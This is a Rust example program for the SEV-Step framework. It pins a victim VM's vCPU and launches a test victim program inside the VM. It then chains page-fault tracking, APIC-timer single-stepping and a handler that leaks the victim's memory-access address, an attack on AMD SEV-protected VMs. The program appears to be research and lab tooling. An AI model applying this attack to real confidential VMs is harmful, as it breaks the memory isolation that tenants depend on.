//!This program shows how use composable event handlers as well as external programs with SEV-Step

use crate::detect_mem_arg_handler::DetectMemArgHandler;
use anyhow::{Context, Result};
use clap::Parser;
use core::time::Duration;
use crossbeam::channel::bounded;

use log::debug;
use sev_step_lib::event_handlers::closure_adapter_handler::ClosureAdapterHandler;
use sev_step_lib::event_handlers::state_machine_handlers::{
    SequenceMatchingStrategy, SkipUntilNSingleSteps, SkipUntilPageFaultSequence,
};
use sev_step_lib::event_handlers::{
    ComposableHandlerChain, EventHandlerOutcome, InitialTrackingRequest,
};
use sev_step_lib::single_stepper::StateMachineNextAction;
use sev_step_lib::types::kvm_page_track_mode;
use sev_step_lib::types::kvm_page_track_mode::{KVM_PAGE_TRACK_ACCESS, KVM_PAGE_TRACK_EXEC};
use sev_step_lib::vmserver_client::parse_hex_str;
use sev_step_lib::{
    api::{Event, SevStep},
    config, vm_setup_helpers,
    vmserver_client::{self},
};
use std::collections::HashMap;
use std::process;

use vm_server::req_resp::InitCustomTargetReq;

pub mod detect_mem_arg_handler;

//TODO: descriptive comment for cli
#[derive(Parser, Debug)]
struct CliArgs {
    /// Path to vm config file
    #[arg(short, long, default_value = "./vm-config.toml")]
    vm_config_path: String,
    #[arg(short='t',long,value_parser=clap_num::maybe_hex::<u32>)]
    apic_timer_value: u32,
}

fn main() -> Result<()> {
    env_logger::init();

    //parse args
    let args = CliArgs::parse();
    let vm_config =
        config::parse_config(&args.vm_config_path).context("failed to parse vm config")?;

    //To properly control the APIC timer, the victim VM must be pinned to a fixed core, that is isolated from the rest of the system. Isolating the core is described in this library's README.
    //In order to pin the VM to a CPU core, we use the QMP interface of QEMU, to look up the PID/TID of the process
    //that runs the VM's VCPU. Then we pin this process to a fixed core
    debug!("main running with debug logging!");
    let vcpu_thread_id = vm_setup_helpers::get_vcpu_thread_id(&vm_config.qemu_qmp_address)
        .context("failed to get VCPU thread id")?;
    debug!("vcpu_thread_id is {}", vcpu_thread_id);

    vm_setup_helpers::pin_pid_to_cpu(vcpu_thread_id, vm_config.vm_cpu_core).context(format!(
        "failed to pin vcpu (tid {}) to core {}",
        vcpu_thread_id, vm_config.vm_cpu_core,
    ))?;
    debug!(
        "Pinned vcpu_thread (tid {}) to core {}",
        vcpu_thread_id, vm_config.vm_cpu_core
    );

    //TODO: make configurable
    let core_ourself = 15;
    debug!("Pinning ourself to {}", core_ourself);
    vm_setup_helpers::pin_pid_to_cpu(process::id() as i64, core_ourself)
        .context(format!("failed to pin ourself to core {}", core_ourself))?;

    //TODO: make configurable
    let external_victim_req = InitCustomTargetReq {
        folder_path: "/home/luca/sev-step/victims/simple_pf_victim".to_string(),
        execute_cmd: "./a.out".to_string(),
    };

    let victim_program =
        vmserver_client::new_custom_target(&vm_config.vm_server_address, &external_victim_req)
            .context(format!(
                "request to create custom target {:?} failed",
                &external_victim_req
            ))?;

    println!(
        "key value pairs returned from server: {:?}",
        victim_program.setup_output
    );

    let trigger_pf_sequence: Vec<u64> = vec![
        parse_hex_str(&victim_program.setup_output["marker_fn1"])?,
        parse_hex_str(&victim_program.setup_output["marker_fn2"])?,
        parse_hex_str(&victim_program.setup_output["victim_fn"])?,
    ];

    //Next we initialize the SEV-Step API. We pass in a channel that is hooked to CTR-C in order to terminate
    //the API connection at any time
    let (tx, abort_chan) = bounded(1);
    ctrlc::set_handler(move || tx.send(()).expect("Could not send signal on channel."))
        .expect("Error setting Ctrl-C handler");
    let sev_step = SevStep::new(true, abort_chan.clone(), true)?;

    /* Now it is time to build the actual attack logic. For this we use SEV-Steps
     * reusable event handlers abstractions.
     * Similar to HTTP middlewares, we can specify functions (or use existing ones
     * provided by SEV-Step) that are called in a chain for each event.
     */

    let mut trigger_pf_seq = SkipUntilPageFaultSequence::new(
        trigger_pf_sequence.clone(),
        SequenceMatchingStrategy::Scattered,
    );

    let mut start_stepping = ClosureAdapterHandler::new(
        "start stepping",
        |event: &Event, api: &mut SevStep, _ctx: &mut HashMap<String, Vec<u8>>| {
            debug!(
                "ClosureAdapterHandler start_stepping called with event {:x?}",
                event
            );
            api.untrack_all_pages(KVM_PAGE_TRACK_EXEC)?;
            api.start_stepping(args.apic_timer_value, &mut [], true)?;
            Ok(EventHandlerOutcome {
                pending_event: event.clone(),
                next_action: StateMachineNextAction::NEXT,
            })
        },
    );

    //TODO: resume here: single stepping in isolated test case works fine but if we try to single step with the next
    //handler we always get zero steps ?!
    //RIP values seem to be wrong. THey are always the same for all page faults ?!

    let mut step_to_mem_access = SkipUntilNSingleSteps::new(2, None);

    let mut leak_mem_arg = DetectMemArgHandler::new(args.apic_timer_value);

    let mut cleanup = ClosureAdapterHandler::new(
        "cleanup",
        |event: &Event, api: &mut SevStep, _ctx: &mut HashMap<String, Vec<u8>>| {
            api.stop_stepping()?;
            Ok(EventHandlerOutcome {
                pending_event: event.clone(),
                next_action: StateMachineNextAction::NEXT,
            })
        },
    );

    let executor = ComposableHandlerChain::new(
        sev_step,
        vec![
            &mut trigger_pf_seq,
            &mut start_stepping,
            &mut step_to_mem_access,
            &mut leak_mem_arg,
            &mut cleanup,
        ],
        Some(InitialTrackingRequest {
            mode: kvm_page_track_mode::KVM_PAGE_TRACK_EXEC,
            gpas: trigger_pf_sequence,
        }),
        Some(move || {
            debug!("run_target_program trigger function is about to run");
            vmserver_client::run_target_program(&vm_config.vm_server_address)?;
            debug!("run_target_program trigger function is done");
            Ok(())
        }),
        Some(Duration::from_secs(30)),
    );

    let _res = executor.run()?;
    println!(
        "Detected memory accesses: {:x?}",
        leak_mem_arg.get_observed_faults()
    );
    let want_addr = parse_hex_str(&victim_program.setup_output["mem_buffer"])?;
    let status_str = if leak_mem_arg
        .get_observed_faults()
        .iter()
        .find(|x| **x == want_addr)
        .is_some()
    {
        "✅"
    } else {
        "❌"
    };
    println!(
        "Got expected memory access at 0x{:x}? : {}",
        want_addr, status_str,
    );

    Ok(())
}
